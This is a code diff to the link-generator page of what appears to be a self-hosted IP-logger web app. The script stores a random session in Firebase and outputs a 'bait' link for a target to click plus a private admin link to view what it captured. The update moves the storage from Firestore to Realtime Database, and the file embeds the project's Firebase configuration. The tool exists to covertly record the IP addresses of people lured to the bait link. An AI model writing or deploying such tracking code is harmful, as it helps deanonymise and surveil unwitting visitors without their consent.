@@ -14,38 +14,36 @@
   <p id="admin"></p>
 
   <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
-    import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.23.0/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.23.0/firebase-database.js";
 
-    // 🔑 Firebase config
     const firebaseConfig = {
       apiKey: "AIzaSyDB_KZ3PvzhxS2rW_MNoUle0quTS254plo",
       authDomain: "ip-logger-hopefully-theone.firebaseapp.com",
+      databaseURL: "https://ip-logger-hopefully-theone-default-rtdb.firebaseio.com",
       projectId: "ip-logger-hopefully-theone",
       storageBucket: "ip-logger-hopefully-theone.appspot.com",
       messagingSenderId: "162611845621",
-      appId: "1:162611845621:web:7b2f3280c58fc2043e28bc",
-      measurementId: "G-VQX9171CF5"
+      appId: "1:162611845621:web:7b2f3280c58fc2043e28bc"
     };
 
     const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
-
-    const repoName = "/meow"; // ✅ important for GitHub Pages
+    const db = getDatabase(app);
 
     function randomString(length) {
       const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-      return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
+      return Array.from({length}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
     }
 
     async function makeNew() {
       const sessionId = randomString(8);
       const code = randomString(6);
 
-      await setDoc(doc(db, "links", sessionId), { code: code, visits: [] });
+      // Save to Realtime Database
+      await set(ref(db, 'links/' + sessionId), { code: code });
 
-      const baitLink = window.location.origin + repoName + "/user.html?id=" + sessionId;
-      const adminLink = window.location.origin + repoName + "/admin.html?id=" + sessionId + "&code=" + code;
+      const baitLink = window.location.origin + "/user.html?id=" + sessionId;
+      const adminLink = window.location.origin + "/admin.html?id=" + sessionId + "&code=" + code;
 
       document.getElementById("bait").innerHTML = `<a href="${baitLink}" target="_blank">${baitLink}</a>`;
       document.getElementById("admin").innerHTML = `<a href="${adminLink}" target="_blank">${adminLink}</a>`;
